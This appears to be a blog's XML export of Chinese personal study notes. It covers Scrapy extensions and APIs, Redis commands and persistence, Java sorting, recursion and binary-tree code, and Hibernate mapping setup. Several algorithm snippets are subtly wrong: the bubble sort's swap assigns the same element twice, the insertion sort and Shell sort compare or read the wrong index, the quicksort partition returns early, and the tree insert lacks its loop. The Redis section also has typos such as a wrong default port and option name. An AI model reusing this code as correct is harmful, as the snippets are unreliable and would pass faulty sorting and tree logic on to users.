STATSMAILER_RCPTS 指定的所有接收人。 Debugging extensions Stack trace dump extension class scrapy.contrib.debug.StackTraceDump 当收到 SIGQUIT 或 SIGUSR2 信号，spider进程的信息将会被存储下来。 存储的信息包括： engine状态(使用 scrapy.utils.engin.get_engine_status()) 所有存活的引用(live references)(参考 使用 trackref 调试内存泄露) 所有线程的堆栈信息 当堆栈信息和engine状态存储后，Scrapy进程继续正常运行。 该扩展只在POSIX兼容的平台上可运行（比如不能在Windows运行）， 因为 SIGQUIT 和 SIGUSR2 信号在Windows上不可用。 至少有两种方式可以向Scrapy发送 SIGQUIT 信号: 在Scrapy进程运行时通过按Ctrl-(仅Linux可行?) 运行该命令(&lt;pid&gt; 是Scrapy运行的进程): kill -QUIT &lt;pid&gt; 调试扩展(Debugger extension) class scrapy.contrib.debug.Debugger 当收到 SIGUSR2 信号，将会在Scrapy进程中调用 Python debugger 。 debugger退出后，Scrapy进程继续正常运行。 核心API 目标用户是开发Scrapy扩展(extensions)和中间件(middlewares)的开发人员。 Scrapy API的主要入口是 Crawler 的实例对象， 通过类方法 from_crawler 将它传递给扩展(extensions)。 requests和response Scrapy使用Request和Response对象来抓取网站。 一个Request对象表示一个HTTP请求，它通常在Spider中生成并由Downloader执行，从而生成一个Response。 cookies (dict or list) – the request cookies. These can be sent in two forms. Using a dict: request_with_cookies = Request(url=&quot;http://www.example.com&quot;, cookies={&apos;currency&apos;: &apos;USD&apos;, &apos;country&apos;: &apos;UY&apos;}) Using a list of dicts: request_with_cookies = Request(url=&quot;http://www.example.com&quot;, cookies=[{&apos;name&apos;: &apos;currency&apos;, &apos;value&apos;: &apos;USD&apos;, &apos;domain&apos;: &apos;example.com&apos;, &apos;path&apos;: &apos;/currency&apos;}]) FormRequest对象 FormRequest类扩展了基础Request，具有处理HTML表单的功能。它使用lxml.html表单 来预先填充表单字段，其中包含来自Response对象的表单数据。 Using FormRequest to send data via HTTP POST If you want to simulate a HTML Form POST in your spider and send a couple of key-value fields, you can return a FormRequest object (from your spider) like this: return [FormRequest(url=&quot;http://www.example.com/post/action&quot;, formdata={&apos;name&apos;: &apos;John Doe&apos;, &apos;age&apos;: &apos;27&apos;}, callback=self.after_post)] 使用FormRequest.from_response()方法模拟用户登录 通常网站通过 &lt;input type=&quot;hidden&quot;&gt; 实现对某些表单字段（如数据或是登录界面中的认证令牌等）的预填充。 使用Scrapy抓取网页时，如果想要预填充或重写像用户名、用户密码这些表单字段， 可以使用 FormRequest.from_response() 方法实现。下面是使用这种方法的爬虫例子: import scrapy class LoginSpider(scrapy.Spider): name = &apos;example.com&apos; start_urls = [&apos;http://www.example.com/users/login.php&apos;] def parse(self, response): return scrapy.FormRequest.from_response( response, formdata={&apos;username&apos;: &apos;john&apos;, &apos;password&apos;: &apos;secret&apos;}, callback=self.after_login ) def after_login(self, response): # check login succeed before going on if &quot;authentication failed&quot; in response.body: self.log(&quot;Login failed&quot;, level=scrapy.log.ERROR) return # continue scraping with authenticated session... Settings Scrapy设定(settings)提供了定制Scrapy组件的方法。您可以控制包括核心(core)，插件(extension)，pipeline及spider组件。 如何访问设定(How to access settings) 设定可以通过Crawler的 scrapy.crawler.Crawler.settings 属性进行访问。其由插件及中间件的 from_crawler 方法所传入: class MyExtension(object): @classmethod def from_crawler(cls, crawler): settings = crawler.settings if settings[&apos;LOG_ENABLED&apos;]: print &quot;log is enabled!&quot; 信号(Signals) Scrapy使用信号来通知事情发生。 内置信号 reg： scrapy.signals.engine_started() 当Scrapy引擎启动爬取时发送该信号。 scrapy.signals.item_scraped(item, response, spider) 当item被爬取，并通过所有 Item Pipeline 后(没有被丢弃(dropped)，发送该信号。 scrapy.signals.response_received(response, request, spider) 当引擎从downloader获取到一个新的 Response 时发送该信号。 异常(Exceptions) 内置异常 reg： scrapy.exceptions.DropItem 该异常由item pipeline抛出，用于停止处理item。 CloseSpider 该异常由spider的回调函数(callback)抛出，来暂停/停止spider。 Item Exporters Scrapy提供了Item Exporters 来创建不同的输出格式，如XML，CSV或JSON。 在实例化了 exporter 之后，你必须： 调用方法 start_exporting() 以标识 exporting 过程的开始。 对要导出的每个项目调用 export_item() 方法。 最后调用 finish_exporting() 表示 exporting 过程的结束 序列化 1. 在 field 类中声明一个 serializer 您可以在 field metadata 声明一个 serializer。该 serializer 必须可调用，并返回它的序列化形式。 实例: import scrapy def serialize_price(value): return &apos;$ %s&apos; % str(value) class Product(scrapy.Item): name = scrapy.Field() price = scrapy.Field(serializer=serialize_price) 2. 覆盖(overriding) serialize_field() 方法 你可以覆盖 serialize_field() 方法来自定义如何输出你的数据。 在你的自定义代码后确保你调用父类的 serialize_field() 方法。 实例: from scrapy.contrib.exporter import XmlItemExporter class ProductXmlExporter(XmlItemExporter): def serialize_field(self, field, name, value): if field == &apos;price&apos;: return &apos;$ %s&apos; % str(value) return super(Product, self).serialize_field(field, name, value) Item Exporters 这是一个对所有 Item Exporters 的(抽象)父类。它对所有(具体) Item Exporters 提供基本属性，如定义export什么fields, 是否export空fields, 或是否进行编码。 XmlItemExporter 以XML格式 exports Items 到指定的文件类. CsvItemExporter 输出 csv 文件格式. 如果添加 fields_to_export 属性, 它会按顺序定义CSV的列名. JsonItemExporter 输出 JSON 文件格式, JsonLinesItemExporter 输出 JSON 文件格式, 每行写一个 JSON-encoded 项.这个类能很好的处理大量数据.]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>框架</category>
        <category>scrapy</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2FRedis%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[Redis是什么？ REmote Dictionary Server（Redis）是一个由Salvatore Sanfilippo写的key-value存储系统。 优点： 能支持超过100K+每秒的读写频率。 安装： 实验楼（省略） 使用： Sudo service reds-server start redis-cli &gt;set mykey somevalue &gt;get mykey 可以用set和get来创建和检索strings 可以对已有的key重新赋值： &gt;set mykey newval nx &gt;set mykey newval xx 加法器： &gt;set counter 100 &gt;incr counter。 加1 &gt;incr counter &gt;incrby counter 50. 加50 使用mset和mget完成一次性多个key-value对应关系： &gt;mset a 10 b 20 c 30 &gt;mget a b c Push一类命令返回值为list的长度： &gt;rpush mylist A &gt;rpush mylist B &gt;lpush mylist first &gt;lrange mylist 0 -1 rpush为添加xx元素 Lrange里面的0表示list开头第一个，-1表示list倒数第一个，lrange为查看list元素 &gt;rpush mylist 1 2 3 4 5 “foo bar” &gt;lrange mylist 0 -1 pop命令： &gt;del mylist &gt;rpush mylist a b c. &gt;rpop mylist 取出mylist最右边的元素 &gt;lrange mylist 0 -1 &gt;lpop mylist &gt;lrange mylist 0 -1 redis hashes存储： &gt;hmset user:1000 username antirez birthyear 1977 verified 1 &gt;hget user:1000 username &gt;hget user:1000 birthyear &gt;hgetall user:1000 &gt;hmget user:1000 username birthyear no-such-vield hash加法： &gt;hincrby user:1000 birthyear 10 sadd命令产生一个无序集合，返回集合元素个数，smembers用于查看集合 &gt;sadd myset 1 2 3 &gt;smembers myset sismember用于查看集合是否存在以及元素是否存储，匹配成功返回1，失败返回0 zadd是添加有序集合，zrange正序查看，zrevrange是反序查看 &gt;zadd hackers 1940 &quot;Alan Kay&quot; &gt;zadd hackers 1957 &quot;Sophie Wilson&quot; &gt;zadd hackers 1953 &quot;Richard Stallman&quot; &gt;zrange hackers 0 -1 &gt;zrevrange hackers 0 -1 使用withscores参数返回记录值 &gt;zrange hackers 0 -1 withscores ):exists和del &gt;set mykey hello &gt;exists mykey &gt;del mykey &gt;exists mykey ):type and keys type查看value的类型，没有则返回none，keys查看key列表 &gt;set mykey x &gt;type mykey &gt;keys my* &gt;del mykey &gt;keys my* &gt;type mykey ):randomkey and clear ): rename and renamenx &gt;rename mylist newlist ):dbsize 返回当前数据库的key总数 ）：expire。限制key生存时间，单位秒 &gt;set key some-value &gt;expire key 10 &gt;get key &gt;get key. 10m后执行时，值已不存在 ）：限时操作可以在set命令中实现，ttl查询key的剩余生存时间 &gt;set key 100 ex 30. (30秒) &gt;ttl key &gt;ttl key ):flushdb:清空当前数据库中的所有键 ):flushall：清空所有数据库中的所有键 ）：config get and config set config get：用于读取运行redis服务器的配置参数 config set：用于更改运行redis服务器的配置参数 auth：认证密码 &gt;config get requirepass (查看密码) &gt;config set requirepass test123 (设置密码) &gt;config get requirepass (报错，没有认证) &gt;auth test123 &gt;config get requirepass 查询数据类型的最大条目： &gt;config get *max-*-entries* config resetstat:重置数据统计报告 ):info查询redis的相关信息 reg: &gt;info keyspace &gt;info server &gt;info cpu ）：设置密码 grep -n requirepass /etc/redis/redis.conf sudo vim /etc/redis/redis.conf 将# requirepass foobared 改为. requirepass test123 即可 ）：重启redis-server与密码验证 sudo service redis-server restart redis-cli &gt;info &gt;auth test123 &gt;info 第二种方式： redis-cli -a test123 &gt;info ）：redis事务处理，exec顺序执行队列中的命令 &gt;multi （进入事务） &gt;set name a &gt;set name b &gt;exec &gt;get name ）：持久化机制 1.快照。默认方式 2.aof save 300 10 #300秒内如果超过10个key被修改，则快照保存 配置文件中的可配置参数: appendonly yes //启用aof持久化方式 #appendfsync always //收到写命令就立即写入磁盘，最慢，但是保证了数据的完整持久化 appendfsync everysec。//每秒钟写入磁盘一次，在性能和持久化方面做了很好的折中 #appendfsync no。//完全依赖os，性能最好，持久化没有保证 &gt;help save &gt;save ======================= redis系统版 redis 01。 1.介绍 1.1 redis是什么 redis是完全开源免费的，遵守BSD协议，是一个高性能的key-value数据库。 1.2redis主要特点 支持数据的持久化，可以讲内存中的数据保存在磁盘中，重启的时候自动再次加载进行使用 既支持key-value类型的数据操作，还提供list，set，zset，hash等数据结构的存储 支持数据的备份，采用master-slave模式的主从备份。 性能极高-redis能读的速度是11万次/s，写的速度是8万次/s。 所有操作均为原子性操作 丰富的实用特性，如订阅-发布模式，生产者消费者模式，key过期等常用易用的模式 1.3竞品组件 MemoryCache-kv🌟缓存数据库：单进程多线程模型 Apache Ignite-分布式关系型缓存数据库 SSDB-kv型缓存数据库 2.redis安装与基本操作 windows安装 资源链接入口地址：https://github.com/MicrosoftArchive/redis/releases 下载导航-选择2.8.x版本均可 下载完成解压即可完成 开启服务 cmd进入对应目录后，找到服务命令-redis-server.exe，至少设置maxheap后即可运行，如设置最大可展256M内存，则对应的字节为268435456=256*1024KB*1024B redis-server.exe --mapheap 268435456 通过配置文件启动服务 修改redis.windows.conf中的maxheap参数值为268435456 redis客户端链接redis服务器 cmd进入对应目录后，找到服务命令redis-cli.exe 直接运行即可，默认链接127.0.0.1 6579端口 或者自己指定ip ，port redis-cli.exe -h 127.0.0.1 -p 6379 linux安装 资源入口链接-http://download.redis.io/releases/ 下载导航-选择2.8.x版本均可 下载地址为:http://download.redis.io/releases/redis-2.8.24.tar.gz 通过浏览器直接打开，或者wget均可 下载完成后，直接解压为源码包，需要编译后方可使用 编译过程与server运行 tar -xzvf redis-2.8.24.tar.gz cd redis-2.8.24 make cd src ./redis-server 或者./redis-server ../redis.conf //按指定的参数文件来启动redis-server，参数文件配置等同widows的conf文件 查看端口：lsof -i:6379 or. ll /proc/24482. or. ps aux|grep redis maxmemory. 为最大内存。 默认是电脑的最大内存 客户端链接server cd src ./redis-cli redis不同版本之间的互联： window的redis-cli链接linux-redis server bat脚本语言（win）：（linux是shell） auto_startserver.bat: redis-server.exe redis.windows.conf auto_startclient.bat: redis-cli.exe -h 127.0.0.1 -p 6379 3. redis重要说明 3.1 redis架构设计说明 单进程单线程模型的KV数据库 多线程处理可能涉及到锁 多线程处理会涉及到线程切换而消耗CPU 无法发挥多核CPU性能，不过可以通过在单机开多个redis实例来完善 完全基于内存 数据结构简单，对数据操作也简单 使用多路I/O复用模型（网络io事件模型-epoll） 网络IO都是通过socket实现，server在某一个端口持续监听，客户端通过socket（IP+port）与 服务器建立连接 （serversocket.accept），成功建立连接之后，就可以使用socket中封装的InputStream和OutputStream进行IO交互了。 针对每个客户端，Server都会创建一个新线程专门用于处理 默认情况下，网络IO是阻塞模式，即服务器线程在数据到来之前处于阻塞状态，等到数据到达，会自动唤醒服务器线程，着手进行处理。阻塞模式下，一个线程只能处理一个流的IO事件 5种网络IO模型。 （单线程的数据最好是要精简） 阻塞IO，非阻塞IO，IO复用模型，信号驱动IO，异步IO模型 IO复用模型中包括：select模式，poll模式，epoll模式（event poll模式），其中epoll是select和poll模型的升级优化，使得一个线程可以最大限度，最高效的监听和响应更多路客户端的IO请求 3.2 redis持久化重要说明 redis数据存储模式只有两种 cache-only 只做为“缓存”服务，数据均在内存中，不持久化数据，服务停掉则数据全部丢失，且无恢复方法，高速但安全性低 persistence 数据不只是在内存中，还会以配置的持久化方式持久化到磁盘中，保证服务停止后数据还可以恢复 持久化方式选择 RDB：默认 在某个条件番组后触发，一次性快照（snapshot）。将所有数据写入一个临时文件，持久化结束后，用这个临时文件替换上次持久化的文件，达到数据恢复。 snapshot触发的时机，是有“间隔时间”和“变更次数”共同决定，同时符合2个条件才会触发snapshot，否则“变更次数”会被继续累加到下一个“间隔时间”上。 snapshot过程上启动一个独立的子进程完成，故并不阻塞客户端请求。snapshot首先将数据写入临时文件，当成功结束后，将临时文件重命名为dump.rdb rdb优缺点说明： 优点： 文件紧凑 形式简单即单rdb文件 由子进程完全独立搞定对主进程无影响 恢复速度快 缺点： 每次保存都是保存一个完整数据集的操作，持续时间可长可短，对丢失数据控制力不佳 若数据量过大，造成CPU和IO压力大，会影响主线程服务性能 Append-only file（AOF） 将“写操作+数据”以格式化指令的方式追加到操作日志文件的尾部，“日志文件”保存了历史所有的操作过程 当server需要数据恢复时，可以直接replay此日志文件，即可还原所有的操作过程。 由于aof操作是发生在后台异步线程执行，可以采用no文件同步（交给操作系统策略同步），每秒钟fsync同步一次，每个写入发生时fsync同步一次，默认为每秒同步一次。 aof也不是绝对无数据丢失的：aof是写入内存cache，由后台线程按照aof策略执行fsync，极端情况下依然会丢失相应的数据 aof优缺点说明： 优点： 数据持久化更及时，效果更好 尾部追加方式，且为后台线程执行，效果很高，亦不影响主线程服务性能 自动进行aof日志重写和替换，达到适时瘦身的效果 日志文件为文本形式，易读易维护易修复 缺点： aof日志文件体积一般比rdb方式要大 在数据恢复时，aof的恢复速度一般是慢于rdb 4.redis常用命令 redis设置密码 在redis.conf中，修改requirepass参数 requirepass xxxxxx 重新启动redis-server ./redis-server ../redis.conf 客户端带密码连接 ./redis-cli -a xxxxxx 客户端先进入后命令验证 ./redis-cli auth xxxxxx key常用命令：（第11集） set key value get key del key dump key //返回key对应的序列化后的值 keys pattern //常用的是keys * exists key expire key seconds //给指定key设置失效时间 expireat key timestamp //以截止时间为失效时间段(时间戳/s) ttl key //返回剩余存活时间,-1为永久,-2为没有 randomkey rename key newkey renamenx key newkey //当newkey不存在时，将key改为newkey type key 5.hashmap常用命令 hset map1 k1 v1 hsetnx key field value hvals key //获取其所有的key值 hexists key field hget key value hgetall key hkeys key hlen key //取得所有的键值 hmget key field1 [field2]... hmset key field1 value1 [field2 value2] 6.list常用命令以及生产者消费者模式的实现 lpush lpushx lrange key index_start index_stop //获取指定范围的value rpop key //移除并获取列表中最后一个参数 rpush rpushx llen key lpop key //移除并获取列表中第一个参数 //这里用下面两个参数来实现生产者消费者。 //多开几个redis来模拟生产者消费者的意思,即1个先长时间阻塞住，另外几个来往里面生产 blpop key1 [key2] timeout //移出并获取列表的第一个数,如果没有值取则阻塞timeout秒 brpop key1 [key2] timeout 7.set和zset set主要存储的是String类型. hash表实现 sadd key member1 [member2] srem key member1 [member2] //删除 sismember key member //判断key在set里面是否存在 smembers key //返回所有成员 smove A B member spop key sunion key1 [key2] //返回指定所有集合的并集 sunionstore C key1 [key2] //并集后存储到C集合 sinter key1 [key2] scard key //获取集合成员数 sdiffstore C key1 [key2] //差集，存到C sinterstore C key1 [key2] zset（SortedSet）有序集合 跟set比多了一个double的分数参数,从小到大排序 zadd key score value zcard key zcount key min max //计算有序集合中指定区间分数的成员数 zincrby key increment member //对指定成员的分数加上增量increment zinterstore C numbkeys key[key...] //交集，C zlexcount key min max //计算指定字典区间内成员数 (- + 指全部； [:指定特定值) zrange key start stop //通过索引区间返回有序集合内指定区间内成员 zrangebylex key min max //通过字典区间返回成员 zrank key member //返回指定成员的索引 zrem zscore key member //返回有序集中成员的分数值 ... 8.使用HyperLogLog结构做高效基数统计 基数这里就是去重的意思 1.硬统计-hashset （1000万个） 2.bitset：位图：-bloomfilter 3.概率统计基数：极小的空间，通过概率方式求出巨大数量的一个基数结果，reg：几十亿。但是不够精准。 在1%标准误差范围内，可以用该结构。 优点：输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定的，且很小的。每个HyperLogLog键只需要12KB内存，即可计算近2^64个不同元素的基数。且其所占存储空间并不是线性增长的。 只计算基数，并不存储数据本身，故不能查看元素。 pfadd hyper1 v1 v2 v3 pfcount hyper1 (reg:统计网站的UV信息等) redis事务 可以理解为批量执行单条命令。而且中间不会被其它事物打断。 multi set k1 v1 set k2 v2 set k2 v3 exec (上面命令批量执行) multi set k1 v1 discard //取消事务，取消set k1 v1 这个块的命令 redis连接服务器操作 echo &quot;123&quot; ping 127.0.0.1 //PONG代表OK quit select index //切换到指定的数据库，默认有16个数据库，默认选择索引为0的数据库 bgrewriteaof ... dbsize flushall 清空所有数据库key flushdb 清空当前数据库key lastsave monitor 调试时用,监控 save shudown slaveof host port 将当前服务器变为指定服务器的从属服务器 slaveof 127.0.0.1 6379 -a tianliangedu java操作redis ·java操作redis的第三方库jedis com.utils public class RedisUtil{ main(){ //连接本地的Redis服务 Jedis jedis = new Jedis(&quot;localhost&quot;,6379); jedis.auth(&quot;tianliangedu&quot;); //查看服务是否运行 sout(&quot;服务正在运行：&quot; + jedis.ping()); //添加kv jedis.set(&quot;jedis_k1&quot;,&quot;jedis_v1&quot;); sout(jedis.get(&quot;jedis_k1&quot;)); //添加集合 jedis.hset(&quot;set1&quot;,&quot;set_k1&quot;,&quot;set_v1&quot;); sout(jedis.hget(&quot;set1&quot;,&quot;set_k1&quot;)); } } 6.redis使用场景 ·加速数据库访问 ·缓存一些静态数据 (不需要去mysql数据库里查) ·缓存一些不经常变化数据 ·缓存一些高耗时计算的数据 ·缓存一些预计算的数据 ·充当中间件，做系统模块或子系统之间的解耦使用。(可以不用http通信)]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>数据库</category>
        <category>Redis</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>数据库</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习笔记01--Java实现]]></title>
    <url>%2F2018%2F09%2F10%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-Java%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[java算法 最炫小小生；Java数据结构与算法[20讲] note01 数组 note02 1.简单排序 1.1冒泡排序 1.2选择排序 1.3插入排序 1.1冒泡 //从小到大 int tmp=0; for(int i=0;i&lt;arr.length-1;i++){ for(int j=arr.length-1;j&gt;i;j--){ if(arr[j]&lt;arr[j-1]){ tmp = arr[j]; arr[j] = arr[j-1]; arr[j] = tmp; } } } 1.2选择排序 int k=0; long tmp=0; for(int i=0;i&lt;arr.length-1;i++){ k=i; for(int j=i;j&lt;arr.length;j++){ if(arr[j]&lt;arr[k]){ k=j; } } tmp=arr[i]; arr[i]=arr[k]; arr[k]=tmp; } 1.3插入排序 long tmp=0; for(int i=1;i&lt;arr.length;i++){ tmp=arr[i]; int j=i; while(j&gt;0 &amp;&amp; arr[j]&gt;=tmp){ arr[j]=arr[j-1]; j--; } arr[j]=tmp; } note03 栈和列队 //列队类，先进先出 public class MyQueue{} note04 链表 /* * 链节点，相当于是车厢 */ public class Node{ //数据域 public long data; //指针域 public Node next; public Node(long value){ this.data = value; } //显示方法 public void display(){ sout(data + &quot; &quot;); } } /* * 链表，相当于火车 */ public class LinkList{ //头结点 private Node first; public LinkList(){ first = null; } ... } note05 双端链表 note06 递归 分递和归，递归的return返回到开头 三角数字：1 3 6 10 15 21。。。 public static void getNumber(int){ int total = 0; while(n &gt; 0){ total = total + n; n --; } return total; } public static int getNumberByRecursion(int n){ if(n == 1){ return 1; }else{ return n + getNumberByRecursion(n - 1); } }//两者结果相同 Fibonacci public static int getNumber(int n){ if(n == 1){ return 0; }else if(n == 2){ return 1; }else{ return getNumber(n - 1)+ getNumber(n - 2); } } note07 递归的高级应用 汉诺塔 public class HanoiTower{ /* * 移动盘子 * topN:移动的盘子数 * from:起始塔座 * inter:中间塔座 * to:目标塔座 */ public static void doTower(int topN,char from,char inter,char to){ if(topN == 1){ sout(&quot;盘子1，从&quot;+ from + &quot;塔座到&quot; + to + &quot;塔座&quot;); }else{ doTower(topN -1 , from , to, inter); sout(&quot;盘子&quot; + tonN + &quot;，从&quot;+ from + &quot;塔座到&quot; + to + &quot;塔座&quot;); doTower(topN -1, inter, from, to); } } } note08 希尔排序 基于插入排序 插入排序的缺陷，多次移动： 假如一个很小的数据在靠右端的位置上，那么要将该数据排序到正确的位置上，则所有的中间数据都需要向右移动一位 优点： 希尔排序通过加大插入排序中元素之间的间隔，并对这些间隔的元素进行插入排序，从而使得数据可以大幅度的移动。当完成该间隔的排序后，希尔排序会减少数据的间隔再进行排序。 间隔的计算： 间隔h的初始值为1，通过h=3*h+1来计算循环，直到该间隔大于数组的大小时停止。最大间隔为不大于数组大小的最大值。 间隔的减少： 可以通过公式h=(h-1)/3来计算 public class Shellsort{ public static void sort(long[] arr){ //初始化一个间隔 int h = 1; //计算最大间隔 while(h &lt; arr.length / 3){ h = h * 3 + 1; } while(h &gt; 0){ //进行插入排序 long tmp = 0; for (int i = h; i &lt; arr.length; i ++){ tmp = arr[h]; int j = i; while(j &gt; h - 1 &amp;&amp; arr[j - h] &gt;= tmp){ arr[j] = arr[j - h]; j -= h; } arr[j] = tmp; } //减小间隔 h = (h - 1) / 3; } } } note09 快速排序 通常将一个数组划分成两个子数组，然后递归调用自身为每个子数组进行快排 一般将数组最右端的数据为关键字 //划分数组 public static int partition(long arr[],int left,int right,long point){ int leftPtr = left - 1; int rightPtr = right;//因为从最右端前一个位置循环的，所以不用+1 while(true){ //循环,将比关键字大的留在左端 while(leftPtr &lt; rightPtr &amp;&amp; arr[++leftPtr] &lt; point); //循环，将比关键字大的留在右端 while(rightPtr &gt; leftPtr &amp;&amp; arr[--rightPtr] &gt; point); if(leftPtr &gt;= rightPtr){ break; }else{ long tmp = arr[leftPtr]; arr[leftPtr] = arr[rightPtr]; arr[rightPtr] = tmp; return leftPtr; } } //将关键字和当前leftPtr所指的这一个进行交换 long tmp = arr[leftPtr]; arr[leftPtr] = arr[right]; arr[right] = tmp; } public static void sort(long[] arr, int left, int right){ if(right - left &lt;= 0){ return; }else{ //设置关键字 long point = arr[right]; //获得切入点，同时对数组进行划分 int partition = partition(arr,left,right,point); //对左边的子数组进行快速排序 sort(arr,left,partition-1); //对右边的子数组进行快速排序 sort(arr,partition + 1, right); } } note11 二叉树的基本操作 1.插入节点 从根节点开始查找一个相应的节点，这个节点将成为新插入节点的父节点。当父节点找到后，通过判断新节点的值比父节点的值大小来决定是连接到左子节点还是右子节点 2.查找节点 从根节点开始查找，如果查找的节点值比当前节点的值小，则继续查找其左子树，否则查找其右子树。 //二叉树类 public class Tree{ //根节点 public Node root; //插入节点 public void insert(long value){ //封装节点 Node newNode = new Node(value); //引用当前节点 Node current = root; //引用父节点 Node parent; //如果root为null，也就是第一插入的时候 if(root == null){ root = newNode;//这里把第一次插入当成了root return; }else{ //父节点指向当前节点 parent = current; //如果当前指向的节点数据比插入的要大，则向左走 if(current.data &gt; value){ current = current.leftChild; if(current == null){ parent.leftChild = newNode; return; } }else { current = current.rightChild; if(current == null){ parent.rightChild = newNode; return; } } } } //查找节点 public Node find(long value){ //引用当前节点，从根节点开始 Node current = root; //循环，只要查找值不等于当前节点的数据项 while(current.data != value){ //进行比较，比较查找值和当前节点的大小 if(current.data &gt; value){ current = current.leftChild; }else{ current = current.rightChild; } if(current == null){ return null; } } return current; } } //二叉树节点 public class Node{ //数据项 public long data; //数据项 public String sData; //左子节点 public Node leftChild; //右子节点 public Node rightChild; //构造方法 public Node(long data,String sData){ this.data = data; this.sData = sData; } } note12 遍历二叉树 遍历树 前序遍历 1.访问根节点 2.前序遍历左子树 3.前序遍历右子树 中序遍历 1.中序遍历左子树 2.访问根节点 3.中序遍历右子树 后序遍历 1.后序遍历左子树 2.后序遍历右子树 3.访问根节点 //二叉树类 public class Tree{ //前序遍历 public void frontOrder(Node localNode){ if(localNode != null){ //访问根节点 sout(localNode.data + &quot;,&quot; + localNode.sData); //前序遍历左子树 frontOrder(localNode.leftChild); //前序遍历右子树 frontOrder(localNode.rightChild); } } //中序遍历 public void inOrder(Node localNode){ if(localNode != null){ //中序遍历左子树 inOrder(localNode.leftChild); //访问根节点 sout(localNode.data + &quot;, &quot; + localNode.sData); //中序遍历右子树 inOrder(localNode.rightChild); } } //后序遍历 public void afterOrder(Node localNode){ if(localNode != null){ //后序遍历左子树 afterOrder(localNode.leftChild); //后序遍历左子树 afterOrder(localNode.rightChild); //访问根节点 sout(localNode.data + &quot;, &quot; + localNode.sData); } } } note13 删除二叉树节点 删除节点是二叉树操作中最复杂的。在删除之前首先要查找药删的节点。找到节点后，这个要删除的节点可能会有三种情况需要考虑。 1.该节点是叶子节点，没有子节点 要删除叶节点，只需要改变该节点的父节点的引用值，将指向该节点的引用设置为null就可以了 2.该节点有一个子节点 改变父节点的引用，将其直接指向要删除节点的子节点 3.该节点有两个子节点 要删除有两个子节点的节点，就需要使用它的中序后继来替代该节点 //第13讲 02:00]]></content>
      <categories>
        <category>技能</category>
        <category>数学</category>
        <category>算法/分析</category>
        <category>Java实现</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hibernate学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2FHibernate%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[Hibernate学习 //note_day01 CRM //其实白话就是对客户进行交互的系统 客户信息管理 联系人管理 客户拜访管理 综合查询 统计分析 系统管理 框架：指的是软件的半成品，已经完成了部分功能 EE三层架构：MVC 解决方案： 客户端层 Html,CSS,JS替代了JavaApplet web层 Servlet、JSP 业务逻辑层 EJB 持久层 SSH（Struts+Spring+Hibernate） SSM（SpringMVC+Spring+Mybatis） web层 业务层 持久层 Servlet,JSP JavaBean JDBC Struts2 Spring Hibernate SpringMVC MyBatis Hibernate(开放源代码的对象关系映射框架) ORM框架 自动生成SQL语句 ORM：（对象关系映射） 指的是将一个java中的对象域关系型数据库中的表建立一种映射关系，从而操作对象就可以操作数据库中的表 对象和一个表建立映射关系 Java:Object MySql:Relational User{ create table user{ String name; name varchar(20), String pwd; pwd varchar(20) } } -&gt; UserDao{ public void save(User user){ session.save(user); } } 通过配置（XML）来实现的 下载Hibernate5 documentation :Hibernate开发文档 lib :Hibernate开发包 optional :可选的jar包 required :Hibernate开发的必须的依赖包 project :Hibernate提供的项目(里面有例子) 引入的jar包： ·数据库驱动包 ·Hibernate开发的必须的jar包 ·Hibernate日志的包 new-&gt;Java project -&gt; com.ithima.hibernate.demo1 Customer.java //客户管理的实体类 创建SQL表-&gt; 创建实体类 //客户管理的实体类 public class Customer{ private Long cust_id; private String cust_name; ... } -&gt;创建映射 (类名.hbm.xml) new-&gt;XML-&gt;Customer.hdm.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; //映射约束： hibernate-core-5.0.7.Final.jar-&gt;org.hibernate-&gt; hibernate-mapping-3.0.dtd-&gt; 复制约束: &lt;! DOCTYPE hibernate-mapping PUBLIC &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot; &quot;http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd&quot;&gt; &lt;hibernate-mapping&gt;//根标签 &lt;!-- 建立类与表的映射 --&gt; &lt;class name=&quot;com.xxx.Customer&quot; table=&quot;cst_customer&quot;&gt; &lt;!-- name:哪个类；table：哪个表;来建立映射--&gt; &lt;!-- 建立类中的属性与表中的主键对应 --&gt; &lt;id name=&quot;cust_id&quot; column=&quot;cust_id&quot;&gt; &lt;!-- 主键生成策略：一般先用本地策略开发 --&gt; &lt;generator class=&quot;native&quot;/&gt; &lt;/id&gt; &lt;!-- 建立类中的普通的属性和表的字段的对应 --&gt; &lt;!-- 即主键以外的属性 --&gt; &lt;property name=&quot;cust_name&quot; column=&quot;cust_name&quot; type=&quot;string&quot; length=&quot;32&quot; /&gt; &lt;property name=&quot;cust_level&quot; column=&quot;cust_level&quot; /&gt; &lt;property name=&quot;cust_phone&quot; column=&quot;cust_phone&quot; /&gt; &lt;!-- type:java --&gt; &lt;property name=&quot;cust_mobile&quot; column=&quot;cust_mobile&quot; type=&quot;java.lang.String&quot; /&gt; &lt;!-- type:hibernate --&gt; &lt;property name=&quot;cust_mobile&quot; column=&quot;cust_mobile&quot; type=&quot;string&quot; /&gt; &lt;!-- type:数据库类型 --&gt; &lt;property name=&quot;cust_mobile&quot; &gt; &lt;column name=&quot;cust_mobile&quot; sql-type=&quot;varchar&quot;&gt;&lt;/column&gt; &lt;/property&gt; ... &lt;/class&gt; &lt;/hibernate-mapping&gt; 